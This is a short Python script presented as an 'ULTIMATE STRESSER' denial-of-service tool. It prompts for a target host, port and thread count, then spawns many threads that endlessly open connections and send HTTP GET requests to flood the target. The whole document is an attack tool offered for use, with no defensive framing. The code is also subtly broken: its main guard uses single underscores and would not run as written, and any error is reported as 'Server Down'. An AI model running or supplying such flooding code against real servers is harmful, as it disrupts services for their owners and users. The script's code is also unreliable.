import socket, threading, os, time
from colorama import Fore, Style, init

init()

def banner():
    os.system('clear')
    print(Fore.RED + Style.BRIGHT + r"""
             ,      ,
            /(.-""-.)\
        |\  \_    _/  /|
        \ \ / ._  _. \ / /
         \ (   <@>    ) /      [ Rana.nj ]
          \ \   (_)   / /     [ ULTIMATE ]
           \ \   ^   / /      [ STRESSER ]
            \ '-===-' /
             '-------'
    """ + Fore.GREEN + r"""
    #################################################
    #   OWNER: Rana.nj                              #
    #   STATUS: SYSTEM READY                        #
    #   VERSION: 1.0.0                              #
    #################################################
    """ + Fore.WHITE)

def start_stress(target, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
            print(Fore.GREEN + f"[+] Rana.nj -> [SENDING] => {target} | OK")
            s.close()
        except:
            print(Fore.RED + f"[!] Rana.nj -> [FAILED] => Server Down")
            time.sleep(1)

if _name_ == "_main_":
    banner()
    t = input(Fore.YELLOW + "Target (Link/IP): ")
    p = int(input(Fore.YELLOW + "Port (Default 80): ") or 80)
    th = int(input(Fore.YELLOW + "Threads (Default 150): ") or 150)
    
    print(Fore.RED + "\n[!] ATTACK STARTING...")
    time.sleep(2)

    for i in range(th):
        threading.Thread(target=start_stress, args=(t, p), daemon=True).start()

    while True: time.sleep(1)
